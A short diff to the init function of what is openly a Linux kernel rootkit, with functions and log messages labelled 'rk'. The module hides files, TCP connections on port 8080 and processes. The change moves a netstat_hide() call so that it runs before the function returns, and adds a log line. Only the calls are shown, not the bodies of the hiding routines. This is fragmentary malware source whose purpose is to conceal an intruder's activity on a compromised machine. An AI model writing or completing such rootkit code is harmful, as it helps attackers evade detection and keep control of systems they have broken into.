@@ -30,7 +30,9 @@ static int __init start_rootkit(void)
     }
     printk(KERN_ALERT "rk: hide file secsessfully!");
     //HIDE TCP ON PORT 8080
+
     ret = netstat_hide();
+    printk(KERN_ALERT "rk: HIDE PORT 8080!");
 
     //PROCESS HIDE
     ret = process_hide();
@@ -41,7 +43,6 @@ static int __init start_rootkit(void)
     }
     printk(KERN_ALERT "rk: hide the proces!");
     return 0;
-    ret = netstat_hide();
 
 
 
